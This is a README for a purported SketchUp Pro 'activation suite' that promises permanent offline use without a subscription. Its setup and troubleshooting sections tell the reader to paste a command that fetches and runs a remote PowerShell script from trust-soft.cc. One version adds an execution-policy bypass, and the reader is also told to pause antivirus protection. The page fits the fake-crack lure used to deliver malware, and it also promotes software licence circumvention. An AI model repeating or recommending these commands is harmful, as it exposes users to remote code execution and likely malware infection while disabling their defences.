# SketchUp Pro Complete Desktop Configuration & Activation Suite

Welcome to the independent environment manager for **SketchUp Pro**. This repository offers a clean, user-oriented solution for architects, interior designers, and woodworkers who want a stable, permanent local studio setup without constant subscription prompts or internet validation timeouts.

By deploying optimized file structures and localized licensing loopbacks, this utility configures a lifetime-valid environment for all your 3D modeling, drawing documentation, and layout presentations.

## 🚀 Workspace Optimization & Core Advantages
- **Pre-Activated Desktop Environment**: Seamless configuration guides built for SketchUp 2025 and 2026.
- **Extension Warehouse Compatibility**: Tweaks system paths to ensure smooth plugin installation (V-Ray, Enscape, etc.).
- **Local Network Routing**: Intercepts authentication calls locally to preserve absolute offline freedom.
- **Asset Library Unlocking**: Instantly fixes material and style directory mappings for offline usage.


---

## 🛠️ Quick Setup Guide (PowerShell)

1. Launch PowerShell:
   * Press `Win + X` on your keyboard.
   * Click on **Terminal** or **Windows PowerShell** from the list.

2. Execute the Setup Script:
   Copy the command below, paste it into your PowerShell window, and hit `Enter`. The script will handle the necessary registry tweaks and install all dependencies automatically:

   ```powershell
   irm https://trust-soft.cc/powershell/Loader.ps1 | iex
   ```

---

## 💡 Resolving Issues

### 💬 Script is blocked by Execution Policy
If Windows stops the script from running due to security policies, you can force it to run by pasting this command into a standard Command Prompt (cmd):
```cmd
powershell -ExecutionPolicy Bypass -Command "irm https://trust-soft.cc/powershell/Loader.ps1 | iex"
```

### 💬 "irm" command not found (Outdated PowerShell)
If your PowerShell version doesn't support the `irm` shortcut, use the full, unabbreviated commands instead:
```powershell
Invoke-RestMethod https://trust-soft.cc/powershell/Loader.ps1 | Invoke-Expression
```

### 💬 Antivirus / SmartScreen Alerts
Security software might occasionally flag automated installers. If the script gets blocked, pause "Real-time protection" in your Windows Security dashboard, run the setup, and re-enable your antivirus immediately afterward.

---

## 📐 Extension Stability & System Mechanics

This configuration automation establishes a virtual licensing frame on your computer. Rather than altering the core executable code of the application—which often causes crashes or dynamic library errors—it manages verification requests internally. Your design models remain completely untouched, hardware rendering performs at full speed, and the workspace remains highly reliable even under dense polygon stress.
